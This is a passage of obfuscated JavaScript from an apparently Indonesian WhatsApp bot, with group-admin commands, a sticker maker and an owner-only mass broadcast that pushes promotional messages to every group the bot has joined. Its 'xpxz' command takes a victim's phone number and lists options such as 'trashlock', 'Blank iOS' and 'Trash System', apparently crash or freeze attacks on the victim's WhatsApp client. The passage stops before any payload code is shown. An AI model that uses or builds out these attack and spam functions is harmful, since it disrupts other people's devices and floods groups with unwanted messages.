          let _0x3d3c20 = (q ? q : '') + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n";
          for (let _0x23dc9b of _0x327667) {
            _0x3d3c20 += "⊝ @" + _0x23dc9b.id.split('@')[0x0] + "\n";
          }
          _0x1acf89.sendMessage(_0x470adc.chat, {
            'text': _0x3d3c20,
            'mentions': _0x327667.map(_0x581e33 => _0x581e33.id)
          }, {
            'quoted': _0x470adc
          });
        }
        break;
      case "kick":
        {
          if (!_0x455832) {
            return _0x427bb7("Only Group");
          }
          if (!_0x11ef2f && !_0x3cc2ac) {
            return _0x427bb7("Only Admin");
          }
          if (!_0xece5e) {
            return _0x427bb7("Bot Bukan Admin :(");
          }
          let _0x3b0771 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x4ec028.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x1acf89.groupParticipantsUpdate(_0x470adc.chat, [_0x3b0771], "remove").then(_0x20531c => _0x427bb7(util.format(_0x20531c)))["catch"](_0x4e9b7e => _0x427bb7(util.format(_0x4e9b7e)));
        }
        break;
      case "closegroup":
        {
          if (!_0x455832) {
            return _0x427bb7("Khusus Group Bego");
          }
          if (!_0x11ef2f && !_0x3cc2ac) {
            return _0x427bb7("Khusus Admin");
          }
          if (!_0xece5e) {
            return _0x427bb7("Bot Bukan Admin Bego");
          }
          if (!_0x196e0d[0x0]) {
            return _0x427bb7("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (_0x55d820 + _0x25c23d) + "10 second");
          }
          if (_0x196e0d[0x1] == "second") {
            var _0x1d254d = _0x196e0d[0x0] * "1000";
          } else {
            if (_0x196e0d[0x1] == "minute") {
              var _0x1d254d = _0x196e0d[0x0] * "60000";
            } else {
              if (_0x196e0d[0x1] == "hour") {
                var _0x1d254d = _0x196e0d[0x0] * "3600000";
              } else {
                if (_0x196e0d[0x1] == "day") {
                  var _0x1d254d = _0x196e0d[0x0] * "86400000";
                }
              }
            }
          }
          _0x427bb7("*Waktu dimulai dari sekarang*");
          setTimeout(() => {
            _0x1acf89.groupSettingUpdate(_0x470adc.chat, "announcement");
            _0x427bb7("Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin");
          }, _0x1d254d);
        }
        break;
      case "opengroup":
        {
          if (!_0x455832) {
            return _0x427bb7("Khusus Group Bego");
          }
          if (!_0x11ef2f && !_0x3cc2ac) {
            return _0x427bb7("Khusus Admin");
          }
          if (!_0xece5e) {
            return _0x427bb7("Bot Bukan Admin Bego");
          }
          if (!_0x196e0d[0x0]) {
            return _0x427bb7("*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n" + (_0x55d820 + _0x25c23d) + "10 second");
          }
          if (_0x196e0d[0x1] == "second") {
            var _0x1d254d = _0x196e0d[0x0] * "1000";
          } else {
            if (_0x196e0d[0x1] == "minute") {
              var _0x1d254d = _0x196e0d[0x0] * "60000";
            } else {
              if (_0x196e0d[0x1] == "hour") {
                var _0x1d254d = _0x196e0d[0x0] * "3600000";
              } else {
                if (_0x196e0d[0x1] == "day") {
                  var _0x1d254d = _0x196e0d[0x0] * "86400000";
                }
              }
            }
          }
          _0x427bb7("*Waktu dimulai dari sekarang*");
          setTimeout(() => {
            _0x1acf89.groupSettingUpdate(_0x470adc.chat, "not_announcement");
            _0x427bb7("Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan");
          }, _0x1d254d);
        }
        break;
      case "demote":
        {
          if (!_0x43e87d) {
            return _0x427bb7(mess.only.premium);
          }
          if (!_0x455832) {
            return _0x427bb7("Only Group");
          }
          if (!_0x11ef2f && !_0x3cc2ac) {
            return _0x427bb7("Only Admin");
          }
          if (!_0xece5e) {
            return _0x427bb7("Bot Bukan Admin :(");
          }
          let _0x574ac1 = _0x470adc.mentionedJid[0x0] ? _0x470adc.mentionedJid[0x0] : _0x470adc.quoted ? _0x470adc.quoted.sender : _0x4ec028.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x1acf89.groupParticipantsUpdate(_0x470adc.chat, [_0x574ac1], "demote").then(_0x4e1ba8 => _0x427bb7(util.format(_0x4e1ba8)))["catch"](_0x5f4178 => _0x427bb7(util.format(_0x5f4178)));
        }
        break;
      case "promote":
        {
          if (!_0x455832) {
            return _0x427bb7("Only Group");
          }
          if (!_0x11ef2f && !_0x3cc2ac) {
            return _0x427bb7("Only Admin");
          }
          if (!_0xece5e) {
            return _0x427bb7("Bot Bukan Admin :(");
          }
          let _0x5d4a23 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x4ec028.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x1acf89.groupParticipantsUpdate(_0x470adc.chat, [_0x5d4a23], "add").then(_0x1bffe7 => _0x427bb7(util.format(_0x1bffe7)))["catch"](_0x436781 => _0x427bb7(util.format(_0x436781)));
        }
        break;
      case "jpmpromosi":
      case "jpmpromo":
      case "jpm3":
        {
          if (!_0x3cc2ac) {
            return _0x427bb7(mess.only.owner);
          }
          if (!_0x4ec028 && !_0x470adc.quoted) {
            return _0x470adc.reply("teksnya atau replyteks");
          }
          var _0x3c7314 = _0x470adc.quoted ? _0x470adc.quoted.text : _0x4ec028;
          let _0xc9ca5a = 0x0;
          let _0x2058e4 = await _0x1acf89.groupFetchAllParticipating();
          let _0x130b24 = Object.entries(_0x2058e4).slice(0x0).map(_0x4744f9 => _0x4744f9[0x1]);
          let _0x166ba9 = _0x130b24.filter(_0x48926f => _0x48926f.announce == false);
          let _0x264e62 = _0x166ba9.map(_0x14db98 => _0x14db98.id);
          _0x470adc.reply("Memproses Mengirim Pesan Ke *" + _0x264e62.length + " Grup*");
          let _0x21e6f0 = generateWAMessageFromContent(_0x470adc.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x470adc.sender],
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': _0x3c7314
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6285789034010\",\"merchant_url\":\"https://whatsapp.com/channel/0029Val78a7EawdvrnMrxC2B\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"YouTube Owner\",\"url\":\"" + linkyt + "\",\"merchant_url\":\"https://youtube.com/@byxxxzoo\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Testi Di whatsapp\",\"url\":\"" + isLink + "\",\"merchant_url\":\"https://whatsapp.com/channel/0029Val78a7EawdvrnMrxC2B\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\",\"merchant_url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\"}"
                    }]
                  })
                })
              }
            }
          }, {
            'userJid': _0x470adc.sender,
            'quoted': _0x470adc
          });
          for (let _0x32caa5 of _0x264e62) {
            try {
              await _0x1acf89.relayMessage(_0x32caa5, _0x21e6f0.message, {
                'messageId': _0x21e6f0.key.id
              });
              _0xc9ca5a += 0x1;
            } catch {}
            await sleep(global.delayjpm);
          }
          _0x470adc.reply("Berhasil Mengirim Pesan Ke *" + _0xc9ca5a + " Grup*");
        }
        break;
      case "sticker":
      case "stiker":
      case 's':
        {
          if (!_0x3cc2ac) {
            return _0x427bb7(mess.only.owner);
          }
          if (!_0x45209a) {
            return _0x427bb7("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (_0x55d820 + _0x25c23d) + "\nDurasi Video 1-9 Detik");
          }
          if (/image/.test(_0x6e8153)) {
            let _0x4d974e = await _0x45209a.download();
            let _0x55805d = await _0x1acf89.sendStimg(_0x479590, _0x4d974e, _0x470adc, {
              'packname': global.packname,
              'author': global.author
            });
            await fs.unlinkSync(_0x55805d);
          } else {
            if (/video/.test(_0x6e8153)) {
              if ((_0x45209a.msg || _0x45209a).seconds > 0xb) {
                return _0x427bb7("Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik");
              }
              let _0xd678ac = await _0x45209a.download();
              let _0x260e59 = await _0x1acf89.sendStvid(_0x479590, _0xd678ac, _0x470adc, {
                'packname': global.packname,
                'author': global.author
              });
              await fs.unlinkSync(_0x260e59);
            } else {
              _0x427bb7("Kirim/Reply Gambar/Video/Gifs Dengan Caption " + (_0x55d820 + _0x25c23d) + "\nDurasi Video 1-9 Detik");
            }
          }
        }
        break;
      case "xpxz":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          if (!q) {
            return _0x427bb7("Example:\n " + (_0x55d820 + _0x25c23d) + " 62xxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          let _0x2e4c44 = [{
            'title': "⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐗͢𝐯ͯ𝐍 𝐇𝐢͢𝐠͛𝐡 𝐕ͦ͢ 𝟏༑",
              'id': "xvnhigh " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐓ͯ͢𝐫𝐚𝐬͢𝐡 𝐒͢𝐲𝐬𝐭ͯ͢𝐞𝐦ͦ 𝐕͢ 𝟐༑̬",
              'id': "trashlock " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐂𝐨͢𝐦͌𝐛𝐨 𝐁𝐮̈́͢𝐠𝐬 𝐕͋͢ 𝟑༑̬",
              'id': "combo " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐁𝐢͢𝐠𝐞͒𝐫𝐬̽ 𝐐𝐮͢𝐚ͦ𝐤 𝐕͆͢ 𝟒༑",
              'id': "bigershard " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐏𝐫͋͢𝐚𝐝𝐞͢𝐗ͦ 𝐕͇͢ 𝟓༑",
              'id': "pradex " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐕𝐳ͯ͢𝐗𝐭𝐲ͦ 𝐕ͮ͢𝟔༑",
              'id': "vzxty " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐅͢𝐮͛𝐧ͦ𝐊͢𝐱ͯ𝐲 𝐕ͮ͢𝟕༑",
              'id': "funkxy " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐆𝐫͒͢𝐨𝐗𝐳ͯ͢𝐲 𝐕͛͢𝟖༑",
              'id': "groxzy " + target
            }]
          }, {
            'title': "⌜ 𝐈𝚯𝐒 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐁͢𝐥𝐚ͦ𝐧̾𝐤 𝐢͢𝐨̾ͦ𝐬༑",
              'id': "xios " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐈𝐨ͯ͢𝐒 𝐁𝐥͢𝐚𝐜ͯ𝐊͢𝐢𝐧ͮ𝐠༑",
              'id': "iphone " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐃𝐞ͧ͢𝐯𝐢𝐜͋𝐞͖ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐓𝐫͙ͮ͢𝐚𝐬ͯ𝐡 𝐈ͯ𝐨͢𝐒༑",
              'id': "ipkentang " + target
            }]
          }, {
            'title': "⌜ 𝐕𝐘𝐗𝐈𝚯𝐍 ⌟",
            'highlight_label': "🎭⃟༑⌁⃰𝐇͢𝐚͛𝐫𝐝𝐒͢𝐭𝐢𝐜ͯ𝐤 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
              'title': "͝⌁⃰𝐕𝐢͢𝐧ͬ𝐭𝐚͢𝐠ͦ𝐞༑",
              'id': "vintage " + target
            }]
          }, {
            'highlight_label': "🎭⃟༑⌁⃰𝐇͢𝐚͛𝐫𝐝𝐒͢𝐭𝐢𝐜ͯ𝐤 𝐗𝐯͛͢𝐍ཀ͜͡🐉",
            'rows': [{
